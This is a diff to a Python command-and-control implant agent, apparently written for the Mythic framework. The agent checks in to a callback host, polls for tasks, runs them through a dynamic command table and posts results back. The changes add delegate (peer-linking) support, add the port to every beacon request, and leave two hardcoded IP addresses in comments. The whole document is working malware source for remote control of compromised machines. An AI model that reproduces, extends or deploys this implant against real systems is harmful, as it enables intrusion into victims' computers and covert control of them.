@@ -23,9 +23,14 @@ global sudo
 dynfs = {}
 sudo = ""
 responses = []
+delegates = []
+delegates_address = []
+delegates_UUID = []
+delegates_aswers = []
 result = {}
 
-
+#87.20.204.131
+#194.195.242.157
 
 class Agent:
     Server = "callback_host"
@@ -33,7 +38,7 @@ class Agent:
     URI = "/post_uri"
     PayloadUUID = "UUID_HERE"
     UUID = ""
-    UserAgent = "USER_AGENT"
+    UserAgent = {"User-Agent"}
     HostHeader = "domain_front"
     Sleep = "callback_interval"
     Jitter = "callback_jitter"
@@ -78,6 +83,8 @@ def getIP():
 
 def checkin(agent):
 
+    print("[+] CHECKIN")
+
     checkin_data = {    
         "action": "checkin",
         "ip": getIP(),
@@ -94,16 +101,15 @@ def checkin(agent):
     message = to64(serialized)
     uuid = to64(agent.PayloadUUID)
     
-    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers={'User-Agent': agent.UserAgent})
+    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
 
     res = from64(x.text)
-
-    print("\nRESPONSE: " + str(res) + "\n")
 
     agent.UUID = res['id']
 
 
 def get_tasks():
+
     tasks = {
         'action': "get_tasking",
         'tasking_size': -1
@@ -113,11 +119,10 @@ def get_tasks():
     message = to64(serialized)
     uuid = to64(agent.UUID)
 
-    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers={'User-Agent': agent.UserAgent})
+    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
 
     task_list = from64(x.text)
-    if task_list["tasks"]:
-        print("[NEW TASK]: " + str(task_list) + "\n")
+
     return task_list
 
 
@@ -137,7 +142,7 @@ def reverse_upload(task_id, file_id):
     message = to64(serialized)
     uuid = to64(agent.PayloadUUID)
 
-    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers={'User-Agent': agent.UserAgent})
+    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers=agent.UserAgent)
     
     res = from64(x.text)
     print("\nRESPONSE: " + str(res) + "\n")
@@ -153,27 +158,42 @@ def reverse_upload(task_id, file_id):
 
 def post_result():
     global responses
-    response = {
-        'action': "post_response",
-        'responses': responses
-    }
+    global delegates
+    global delegates_aswers
 
-    if responses:
-        print("\n[SEND]: " + str(responses))
+    response = {}
+    if delegates:
+        response = {
+            'action': "post_response",
+            'responses': responses,
+            'delegates': delegates
+        }
+
+    else:
+        response = {
+            'action': "post_response",
+            'responses': responses
+        }
 
     serialized = json.dumps(response)
     message = to64(serialized)
-    uuid = to64(agent.PayloadUUID)
+    uuid = to64(agent.UUID)
 
-    responses = []
-
-    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers={'User-Agent': agent.UserAgent})
+    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
 
     result = from64(x.text)
-    # print("\n[RECEIVE]: " + str(result))
+
+    if "delegates" in result:
+        delegates_aswers = result["delegates"]
+
+    responses = []
+    delegates = []
+
     return result
 
+
 def execute_tasks(tasks):
+
     if tasks:
         for task in tasks['tasks']:
             execute(task)
@@ -186,15 +206,17 @@ def execute_tasks(tasks):
 
     sleep_time = int(agent.Sleep) + r*(int(agent.Sleep) * int(agent.Jitter) / 100)
 
-    # print("[SLEEPING " + str(sleep_time) + "]")
     time.sleep(sleep_time / 5)
+
     post_result()
+
 
 
 def execute(task):
 
     # Search in the dynamic functions first, so a command can be sobstituted through the load functionality
     function = str(task['command'])
+    print("\n[+] EXECUTING " + function)
 
     found = False
 
@@ -266,7 +288,7 @@ if os.path.isfile(uuid_file):
 
 else:
     checkin(agent)
-    print("[CHECKIN] UUID = " + agent.UUID)
+    print("\t [CHECKIN] UUID = " + agent.UUID)
     f = open(uuid_file, "w")
     f.write(agent.UUID)
     f.close()
@@ -275,8 +297,6 @@ while True:
 
     tasks = get_tasks()
     execute_tasks(tasks)
-        
-
 
     r = random.randint(0,1)
     if r < 0.5:
